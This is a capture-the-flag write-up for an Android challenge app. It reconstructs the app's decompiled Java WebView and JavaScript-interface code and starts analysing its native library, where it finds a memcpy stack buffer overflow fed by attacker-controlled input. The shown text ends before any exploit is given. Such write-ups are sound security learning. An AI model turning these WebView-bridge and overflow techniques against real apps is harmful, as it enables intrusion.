@@ -1,0 +1,568 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Challenge 5</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="a-tales-of-cookies-and-overflowing">A tales of cookies and overflowing</h1>
+<p>No, I’m not talking about my mug and breakfast. It’s all related to challenge #5. This one took me some days to be solved but let’s start from the beginning.</p>
+<h2 id="challenge-5-what-a-mess">Challenge #5 what a mess</h2>
+<p>After few days it turns out that the first release was unsolvable so I’m going to skip every attempt I made trying to get it done (and believe me, I slept 3/4 hours a day 😴).</p>
+<h2 id="friends-come-up">Friends come up</h2>
+<p>As always, <strong>IDA</strong> &amp; <strong>jadx</strong> will give us some useful info about our target. The <strong>MainActivity</strong> class contains the following code:</p>
+<pre class=" language-java"><code class="prism  language-java">
+    <span class="token keyword">private</span> WebView mWebView<span class="token punctuation">;</span>
+
+    <span class="token keyword">static</span> <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"native-lib"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">generateString</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        String str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            StringBuilder stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            str <span class="token operator">=</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">generateString</span><span class="token punctuation">(</span>String str<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        String str2 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            StringBuilder stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            str2 <span class="token operator">=</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> str2<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>Bundle bundle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bundle <span class="token operator">=</span> <span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getExtras</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bundle <span class="token operator">=</span> bundle <span class="token operator">!=</span> null <span class="token operator">?</span> bundle<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView <span class="token operator">=</span> <span class="token punctuation">(</span>WebView<span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>activity_main_webview<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">setWebViewClient</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WebViewClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>bundle <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"https://google.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">setWebViewClient</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CoolWebViewClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>mWebView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PetHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"PetHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onBackPressed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Java basically has a binding for everything. It’s possible to run Java methods from javascript code in a web page by exposing these methods through an interface keyword (<strong>PetHandler</strong> one) when @JavascriptInterface annotation is present above the method itself.<br>
+We can even control the web page location by starting the app with an intent containing an <strong>url</strong> extra.<br>
+Last consideration about this class: there’re two methods (one method with arguments overload to be more precise) never used nor accessed 😕. While coding the exploit I realized they were hints 💡.</p>
+<p>Now we can switch to <strong>PetHandler</strong> class:</p>
+<pre class=" language-js"><code class="prism  language-js">
+    <span class="token keyword">public</span> native byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">censorCats</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> native byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">censorDogs</span><span class="token punctuation">(</span>int i<span class="token punctuation">,</span> String str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> native long <span class="token function">getSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    @JavascriptInterface
+    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string">"Pets :)"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    @android<span class="token punctuation">.</span>webkit<span class="token punctuation">.</span>JavascriptInterface
+    <span class="token keyword">public</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String <span class="token function">censorMyCats</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String r7<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">/* JADX: method processing error */</span>
+        <span class="token operator">...</span>
+        <span class="token comment">/*
+        r6 = this;
+        r0 = 0;
+        r1 = new org.json.JSONArray;     Catch:{ JSONException -&gt; 0x003d }
+        r1.&lt;init&gt;(r7);     Catch:{ JSONException -&gt; 0x003d }
+        r7 = r1.length();     Catch:{ JSONException -&gt; 0x003d }
+        r7 = new byte[r7];     Catch:{ JSONException -&gt; 0x003d }
+        r2 = 0;     Catch:{ JSONException -&gt; 0x003d }
+    L_0x000d:
+        r3 = r1.length();     Catch:{ JSONException -&gt; 0x003d }
+        if (r2 &gt;= r3) goto L_0x002e;     Catch:{ JSONException -&gt; 0x003d }
+    L_0x0013:
+        r3 = r1.getInt(r2);     Catch:{ JSONException -&gt; 0x003d }
+        r3 = java.lang.Integer.valueOf(r3);     Catch:{ JSONException -&gt; 0x003d }
+        r4 = r3.intValue();     Catch:{ JSONException -&gt; 0x003d }
+        r5 = 255; // 0xff float:3.57E-43 double:1.26E-321;     Catch:{ JSONException -&gt; 0x003d }
+        if (r4 &lt;= r5) goto L_0x0024;     Catch:{ JSONException -&gt; 0x003d }
+    L_0x0023:
+        return r0;     Catch:{ JSONException -&gt; 0x003d }
+    L_0x0024:
+        r3 = r3.intValue();     Catch:{ JSONException -&gt; 0x003d }
+        r3 = (byte) r3;     Catch:{ JSONException -&gt; 0x003d }
+        r7[r2] = r3;     Catch:{ JSONException -&gt; 0x003d }
+        r2 = r2 + 1;
+        goto L_0x000d;
+    L_0x002e:
+        r1 = new org.json.JSONArray;     Catch:{ JSONException -&gt; 0x003c }
+        r6 = r6.censorCats(r7);     Catch:{ JSONException -&gt; 0x003c }
+        r1.&lt;init&gt;(r6);     Catch:{ JSONException -&gt; 0x003c }
+        r6 = r1.toString();     Catch:{ JSONException -&gt; 0x003d }
+        return r6;
+    L_0x003c:
+        return r0;
+    L_0x003d:
+        r6 = move-exception;
+        r6.printStackTrace();
+        return r0;
+        */</span>
+    <span class="token punctuation">}</span>
+
+    @android<span class="token punctuation">.</span>webkit<span class="token punctuation">.</span>JavascriptInterface
+    <span class="token keyword">public</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String <span class="token function">censorMyDogs</span><span class="token punctuation">(</span>int r1<span class="token punctuation">,</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String r2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">/* JADX: method processing error */</span>
+        <span class="token operator">...</span>
+        <span class="token comment">/*
+        r0 = this;
+        r0 = r0.censorDogs(r1, r2);
+        r1 = new org.json.JSONArray;     Catch:{ JSONException -&gt; 0x000e }
+        r1.&lt;init&gt;(r0);     Catch:{ JSONException -&gt; 0x000e }
+        r0 = r1.toString();
+        return r0;
+    L_0x000e:
+        r0 = 0;
+        return r0;
+        */</span>
+    <span class="token punctuation">}</span>
+
+    @JavascriptInterface
+    <span class="token keyword">public</span> String <span class="token function">getMySomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token function">getSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>So we’ve:</p>
+<ul>
+<li>3 methods imported from <strong>libnative-lib</strong>:<br>
+-  <em>censorCats</em>;<br>
+- <em>censorDogs</em>;<br>
+- <em>getSomething</em>.</li>
+<li>4 methods binded to <strong>javascript interface</strong>:<br>
+- <em>toString</em>;<br>
+- <em>censorMyCats</em>;<br>
+- <em>censorMyDogs</em>;<br>
+- <em>getMySomething</em>.</li>
+</ul>
+<p>The file has been “corrupted” but it’s not a big deal to understand what the code does in each function.</p>
+<h3 id="catcatcat-censormycats-catcatcat">🐱🐱🐱 censorMyCats 🐱🐱🐱</h3>
+<p><strong>censorMyCats</strong> accepts only one argument which is a <strong>String</strong> one. As you probably noticed, the code contains a lot of <code>Catch:{ JSONException -&gt; 0x003d }</code>. This means that there’s a big <code>try/catch</code> statement:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> je<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        je<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Then few more <code>Catch:{ JSONException -&gt; 0x003c }</code> which means that there’s another nested <code>try/catch</code> statement:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> sje<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> fje<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        je<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Time to fill the holes! Since <code>r0</code> is returned and the function returns a <strong>String</strong> we can assume that <code>r0</code> is an empty (null) <strong>String</strong> object while <code>r7</code> points to the argument (<strong>String</strong> object too).</p>
+<pre class=" language-java"><code class="prism  language-java">    r1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span>JSONArray</span><span class="token punctuation">;</span>
+    r1<span class="token punctuation">.</span>&lt;init<span class="token operator">&gt;</span><span class="token punctuation">(</span>r7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r7 <span class="token operator">=</span> r1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>r7<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    r2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>jsonArray<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+</code></pre>
+<p>The second block is a bit tricky due to a loop and a nested if:</p>
+<pre class=" language-java"><code class="prism  language-java">L_0x000d<span class="token operator">:</span>
+    r3 <span class="token operator">=</span> r1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>r2 <span class="token operator">&gt;=</span> r3<span class="token punctuation">)</span> <span class="token keyword">goto</span> L_0x002e<span class="token punctuation">;</span><span class="token number">0x003d</span> <span class="token punctuation">}</span>
+L_0x0013<span class="token operator">:</span>
+    r3 <span class="token operator">=</span> r1<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r3 <span class="token operator">=</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>r3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r4 <span class="token operator">=</span> r3<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r5 <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>r4 <span class="token operator">&lt;=</span> r5<span class="token punctuation">)</span> <span class="token keyword">goto</span> L_0x0024<span class="token punctuation">;</span>
+L_0x0023<span class="token operator">:</span>
+    <span class="token keyword">return</span> r0<span class="token punctuation">;</span>
+L_0x0024<span class="token operator">:</span>
+    r3 <span class="token operator">=</span> r3<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> r3<span class="token punctuation">;</span>
+    r7<span class="token punctuation">[</span>r2<span class="token punctuation">]</span> <span class="token operator">=</span> r3<span class="token punctuation">;</span>
+    r2 <span class="token operator">=</span> r2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> L_0x000d<span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> jsonArray<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Integer b <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>jsonArray<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+        buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Inside the second <code>try/catch</code> statement goes the following piece instead:</p>
+<pre class=" language-java"><code class="prism  language-java">    r1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span>JSONArray</span><span class="token punctuation">;</span>
+    r6 <span class="token operator">=</span> r6<span class="token punctuation">.</span><span class="token function">censorCats</span><span class="token punctuation">(</span>r7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r1<span class="token punctuation">.</span>&lt;init<span class="token operator">&gt;</span><span class="token punctuation">(</span>r6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r6 <span class="token operator">=</span> r1<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> r6<span class="token punctuation">;</span>
+
+    JSONArray cats <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">censorCats</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> cats<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>Joining pieces together we obtain:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> String <span class="token function">censorMyCats</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>jsonArray<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> jsonArray<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Integer b <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>jsonArray<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+            buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            JSONArray cats <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">censorCats</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> cats<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> sje<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> fje<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        je<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="dogdogdog-censormydogs-dogdogdog">🐶🐶🐶 censorMyDogs 🐶🐶🐶</h3>
+<p>This one was simpler. A single <code>try/catch</code> statement and two arguments: <code>r1</code> and <code>r2</code>.</p>
+<pre class=" language-java"><code class="prism  language-java">    r0 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+    r0 <span class="token operator">=</span> r0<span class="token punctuation">.</span><span class="token function">censorDogs</span><span class="token punctuation">(</span>r1<span class="token punctuation">,</span> r2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span>JSONArray</span><span class="token punctuation">;</span>
+    r1<span class="token punctuation">.</span>&lt;init<span class="token operator">&gt;</span><span class="token punctuation">(</span>r0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    r0 <span class="token operator">=</span> r1<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> r0<span class="token punctuation">;</span>
+L_0x000e<span class="token operator">:</span>
+    r0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> r0<span class="token punctuation">;</span>
+
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        dogs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">censorDogs</span><span class="token punctuation">(</span>r1<span class="token punctuation">,</span> r2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> dogs<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> je<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<h2 id="lets-get-down-to-biz">Let’s get down to biz</h2>
+<p>Having finished with Java code we can go further and give a look to <strong>libnative-lib</strong> assembly code. I’m going to inspect the <strong>x86_64</strong> library.</p>
+<h3 id="catcatcat-censorcat-catcatcat">🐱🐱🐱 censorCat 🐱🐱🐱</h3>
+<p>Everybody knows that cats are pure evil. They break things all day long. Here you’re a <a href="https://www.youtube.com/watch?v=R4anpxoHkPI">poc</a> video (my dog’s typing atm). With <strong>IDA</strong> we’ll notice that my dog was right!</p>
+<p><img src="https://i.imgur.com/8ZgUyaq.png" alt=""></p>
+<p>The stack size is <code>0x210</code> bytes but <code>memcpy</code> performs a  copy bigger than the stack. Code speaking:</p>
+<pre class=" language-c"><code class="prism  language-c">    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> input<span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>Where <strong>input</strong> is a pointer to an attacker-controlled byte array: the only argument which <strong>censorMyCats</strong> accepts.</p>
+<p>We’re facing with a <a href="https://ctf101.org/binary-exploitation/stack-canaries/">stack canaries</a> protection and a <a href="https://ctf101.org/binary-exploitation/buffer-overflow/">buffer overflow</a> which we’ll exploit to grab the flag.</p>
+<h3 id="dogdogdog-censordogs-dogdogdog">🐶🐶🐶 censorDogs 🐶🐶🐶</h3>
+<p>My dog asked me to prove that all dogs are good boys/girls. <strong>IDA</strong> shows us this:</p>
+<p><img src="https://i.imgur.com/zuA7mOC.png" alt=""></p>
+<p>Again she was right and again we’ll try to understand the code by converting to its “original” c source:</p>
